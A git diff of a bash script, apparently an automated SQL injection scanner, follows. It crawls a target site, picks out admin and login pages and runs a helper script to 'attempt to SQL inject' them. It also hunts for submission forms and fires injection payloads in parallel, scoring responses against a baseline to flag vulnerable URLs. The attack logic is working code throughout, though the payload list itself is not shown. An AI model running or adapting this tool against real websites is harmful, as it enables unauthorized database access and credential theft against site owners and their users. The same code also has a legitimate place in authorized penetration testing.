@@ -102,7 +102,6 @@ curl_ResponseCode() {
 collect_urls() {
   local url="$1"
   local KATANA_ARGS=()
-  echo -e "Crawling website, and building URL target list"
   KATANA_ARGS=(-u "$url" -jsl -silent)
   [[ -n "$header" ]] && KATANA_ARGS+=(-H "$header")
 
@@ -113,48 +112,33 @@ collect_urls() {
     | sort -u
 }
 
-# Read URL list into array
-echo "Collecting URLs from: $url"
-IFS=$'\n' read -r -d '' -a urlList <<< "$(collect_urls "$url")"
-#Create a list of login pages
-IFS=$'\n' loginPages=($(printf "%s\n" "${urlList[@]}" | grep -iE "(admin|login)$"))
-
-# To echo ALL login pages:
-echo "-----------Login Pages found (${#loginPages[@]})---"
-for adminUrl in "${loginPages[@]}"; do
-	echo "Attemptig to SQL Inject login page"
-    #echo "$adminUrl"
-    "$SCRIPT_DIR/sqlogin.sh" "$adminUrl"
-done
-sleep 2
-
-
-
-
-if [[ ${#urlList[@]} -eq 0 ]]; then
-    echo -e "${YELLOW}No URLs collected, using base URL${NC}"
-    urlList=("$url")
-fi
-
-echo "Found ${#urlList[@]} URLs to test"
-
-#Validate input ----------------
-if [[ -z "$url" ]]; then
-  show_help
-  exit 1
-fi
-
-echo "-------"
-echo "Parallel mode: $parallel_max concurrent requests"
-echo "Loaded ${#payloads[@]} Payload patterns"
-
-# Create grep pattern from falsePositiveResponse array
-patterns=$(IFS='|'; echo "${falsePositiveResponse[*]}")
-
-# Fix variable declarations
-declare -a trueCheckList
-declare -a falseCheckList
-declare -a falsePositiveList
+add_number_variations() {
+    local exceptions=("cart" "checkout" "logout" "login" "profile" "settings" "account")
+    
+    while IFS= read -r url; do
+        [[ -z "$url" ]] && continue
+        # Check if URL already ends with a number
+        if [[ "$url" =~ /[0-9]+$ ]]; then
+            echo "$url"
+            continue
+        fi
+        # Check if URL ends with any exception word
+        skip=false
+        for exception in "${exceptions[@]}"; do
+            if [[ "$url" =~ /${exception}$ ]]; then
+                echo "$url"
+                skip=true
+                break
+            fi
+        done
+        [[ "$skip" == true ]] && continue
+        # If not, create variations with numbers 1-3
+        echo "$url"
+        for i in {1..3}; do
+            echo "${url}/${i}"
+        done
+    done
+}
 
 #---Helper Functions
 get_base_url() {
@@ -162,8 +146,8 @@ get_base_url() {
   echo "$url" | sed -E 's|(/[0-9]+)+$||'
 }
 
-    run_sql_logic_check() {
-    	if [[ $responseCode -eq 404 ]]; then
+run_sql_logic_check() {
+        if [[ $responseCode -eq 404 ]]; then
                return 0
             
             elif [[ $responseCode -gt 404 && $responseCode -le 499 ]]; then
@@ -201,7 +185,6 @@ get_base_url() {
                 truePassCheck=true  
                 
                 if [[ "$attackBody" == "$baselineBody" ]]; then
-                    echo "Debug:check 1"
                     echo -e "$attackUrl"
                     echo "Payload request matches Baseline, SQL Risk Increased"
                     SQLRiskConfidence=$((SQLRiskConfidence + 50))
@@ -227,10 +210,70 @@ get_base_url() {
                 vulnerable_bases["$base_url"]=1
             fi
     }
+
+
+#Validate input 
+if [[ -z "$url" ]]; then
+  show_help
+  exit 1
+fi
+
+
+# Read URL list into array
+echo -e "[${GREEN}+${NC}] - Collecting URLs from: $url"
+IFS=$'\n' read -r -d '' -a urlList <<< "$(collect_urls "$url")"
+#Create a list of login pages
+IFS=$'\n' loginPages=($(printf "%s\n" "${urlList[@]}" | grep -iE "(admin|login)$"))
+#We will add a random number to these Urls, as that is how some we can detect SQL injection on these
+IFS=$'\n' noTrailUrlList=($(printf "%s\n" "${urlList[@]}"| grep -E '\.(js|tsx|php|html|htm|json)(\?|$)'))
+# Expand the URLs with number variationsf=
+urlsNoTrailExpanded=$(printf "%s\n" "${noTrailUrlList[@]}" | add_number_variations)
+# Combine the expanded URLs back into urlList
+IFS=$'\n' read -r -d '' -a urlList <<< "$(printf "%s\n" "${urlList[@]}\n${urlsNoTrailExpanded}" | sort -u)"
+
+
+
+
+echo -e "[${GREEN}+${NC}] - Found ${#urlList[@]} urLs to test"
+echo -e ${YELLOW}"---SQL Injection Target List---${NC}"
+for p in "${urlList[@]}"; do
+    echo "$p"
+done
+echo -e "${YELLOW}---------------------------------------${NC}"
+
+
+
+# Create grep pattern from falsePositiveResponse array
+patterns=$(IFS='|'; echo "${falsePositiveResponse[*]}")
+
+# Fix variable declarations
+declare -a trueCheckList
+declare -a falseCheckList
+declare -a falsePositiveList
+declare -a listVulnUrls
 #----------- LOGIC STARTS HERE ----------
 
 declare -A vulnerable_bases=()
+#
 
+# Check and attempt exploit login pages..
+echo "-----------Login Pages found (${#loginPages[@]})---"
+for adminUrl in "${loginPages[@]}"; do
+    echo "Attemptig to SQL Inject login page"
+    #echo "$adminUrl"
+    "$SCRIPT_DIR/sqlogin.sh" "$adminUrl"
+
+    adminUrl_exit_code=$?
+if [[ $adminUrl_exit_code -eq 1 ]]; then
+    vulnerable=true
+    SQLRiskConfidence=$((SQLRiskConfidence + 25))
+    listVulnUrls+=("$adminUrl")
+fi
+
+done
+
+
+#Main SQL Vuln Loop Checker
 for url in "${urlList[@]}"; do
   [[ -z "$url" ]] && continue
   
@@ -246,10 +289,21 @@ for url in "${urlList[@]}"; do
   falsePassCheck=false
   SQLRiskConfidence=0
 
+#--------------- Running Inside Loop ---------------
+
+# Check and attempt exploit forms on the body of url
+ # Fetch Original Body 
   baselineBody=$(curl_body "$url")
-  echo "Starting SQL Injection checks..."
   echo -e "Target:${GREEN}$url${NC}"
+  echo "Starting SQL Injection checks..."
   
+  echo "Searching for Submission forms on Url"
+  "$SCRIPT_DIR/sqlFormFinder.sh" "$url"
+
+  
+
+
+
   # PARALLEL PROCESSING
   if [[ $parallel_max -gt 1 ]]; then
     echo "Testing ${#payloads[@]} payloads with $parallel_max parallel workers..."
@@ -282,7 +336,7 @@ for url in "${urlList[@]}"; do
         echo "$attackBody" > "$tempdir/body_$index"
         echo "$attackUrl" > "$tempdir/url_$index"
         
-        echo -e "${BLUE}Attacking:$attackUrl${NC}"
+        echo -e "${RED}Attacking:$attackUrl${NC}"
     }
     
     export -f process_payload
